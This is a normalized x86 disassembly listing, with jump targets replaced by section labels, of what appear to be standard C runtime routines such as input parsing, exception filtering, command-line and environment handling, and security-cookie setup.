mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_40c0f2
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
cmp eax 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a0 ] 0x0
mov edi [ ebp - 0x1c0 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
mov bl 0x1
jmp r-xdata
dec [ ebp - 0x18c ]
push edi
push eax
call sub_40c108
pop ecx
pop ecx
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
cmp [ ebp - 0x1c0 ] esi
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec [ ebp - 0x19d ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x69
je r-xdata
cmp [ ebp - 0x1a4 ] 0x46
jne r-xdata
neg edi
movzx eax [ ebp - 0x188 ]
push eax
call sub_4111bb
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1c8 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1cc ] eax
mov [ ebp - 0x1c8 ] ecx
jmp r-xdata
movzx eax [ ebp - 0x188 ]
push eax
call sub_4111bb
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x1a4 ] 0x73
jne r-xdata
push 0x30
pop esi
cmp [ ebp - 0x188 ] esi
jne r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
inc edi
cmp [ edi ] 0x5e
mov esi edi
jne r-xdata
mov [ ebp - 0x19e ] 0x1
mov edi [ ebp - 0x1b8 ]
inc [ ebp - 0x19d ]
inc edi
mov [ ebp - 0x1b8 ] edi
jmp r-xdata
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1a4 ] edx
cmp eax 0x6e
jne r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
and [ ebp - 0x1a8 ] 0x0
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_40c108
pop ecx
pop ecx
push [ ebp - 0x188 ]
shl edi 0x4
call sub_40c0d2
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_411137
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_40c108
pop ecx
pop ecx
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
push [ ebp - 0x188 ]
shld edi esi 0x4
shl esi 0x4
call sub_40c0d2
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_411137
pop ecx
test eax eax
je r-xdata
inc [ ebp - 0x1c4 ]
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
inc [ ebp - 0x1c0 ]
jmp r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
cmp al 0x78
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_40b0d0
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x1 ]
mov [ ebp - 0x19f ] 0xff
cmp [ ebp - 0x1b4 ] 0x0
jne r-xdata
dec [ ebp - 0x194 ]
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x196 ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_40b58c
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x19f ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x188 ] eax
je r-xdata
cmp al 0x58
je r-xdata
mov bl 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
or [ ebp - 0x194 ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c4 ]
mov esi [ ebp - 0x1bc ]
imul edi edi 0xa
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c8 ]
push [ ebp - 0x1cc ]
call sub_40fc30
mov esi eax
mov edi edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
lea eax [ ebp - 0x1f8 ]
push eax
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x1e8 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call sub_41135b
mov ax [ ebp - 0x1e8 ]
add esp 0x10
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_40c0f2
mov [ ebp - 0x1df ] al
mov [ ebp - 0x1a4 ] 0x78
jmp r-xdata
sub [ ebp - 0x194 ] 0x2
cmp [ ebp - 0x194 ] 0x1
jge r-xdata
cmp [ ebp - 0x1a4 ] 0x78
mov [ ebp - 0x1a8 ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_411137
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x195 ] 0x0
je r-xdata
mov eax [ ebp - 0x1cc ]
mov [ esi ] eax
mov eax [ ebp - 0x1c8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1a8 ]
cmp [ ebp - 0x1b4 ] 0x0
mov eax [ ebp - 0x188 ]
lea edi [ edi + eax - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov eax [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
add eax 0xffffffd0
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] edi
je r-xdata
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
mov [ ebp - 0x1bc ] esi
jmp r-xdata
inc bl
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push eax
call sub_40c108
pop ecx
pop ecx
mov [ ebp - 0x188 ] esi
jmp r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x19f ] al
cmp al [ ebp - 0x188 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1a4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov [ ebp - 0x1b8 ] esi
mov esi [ ebp - 0x1bc ]
jmp r-xdata
mov al [ ebp - 0x188 ]
mov ecx [ ebp - 0x1ac ]
inc [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_40c07b
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
inc bl
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
movzx eax al
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_40c108
cmp [ ebp - 0x1a8 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x188 ] 0x65
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov ecx [ ebp - 0x1ac ]
mov [ ebp - 0x188 ] eax
mov al [ ebp - 0x19f ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_40c07b
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
mov eax [ ebp - 0x1ac ]
inc [ ebp - 0x1c4 ]
lea ecx [ ebp - 0x1f8 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x195 ]
dec eax
push eax
push [ rw-data ]
call sub_40778e
pop ecx
call eax
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_40c07b
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_411137
pop ecx
test eax eax
jne r-xdata
xor dl dl
jmp r-xdata
sub al dl
inc al
movzx edi dl
movzx edx al
cmp dl al
ja r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_40c07b
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_40c07b
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
movzx eax al
push eax
call sub_411137
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
and [ ebp - 0x194 ] eax
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_40c07b
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_40c0f2
mov [ ebp - 0x188 ] eax
movzx eax al
sub_40d102
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40dced
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40d153
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_407961
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_40d2b3
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_4073d0
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_4114df
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40d312
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_4073d0
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40ed09
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_40bff0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_40bff0
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_404d8e
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40ed09
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_404d8e
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40f1db
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_407dd4
add esp 0x14
sub_40d3f0
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4114df
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4114df
pop ecx
test eax eax
je r-xdata
call sub_4114df
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40d58a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_4073d0
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40d3f0
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40ecc4
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40d3f0
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40d645
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_40ecc4
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_40ecc4
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_40b660
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_404d8e
pop ecx
mov [ ebp - 0x4 ] ebx
sub_40d77c
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40d7a2
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40d7c8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40d85e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40f290
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
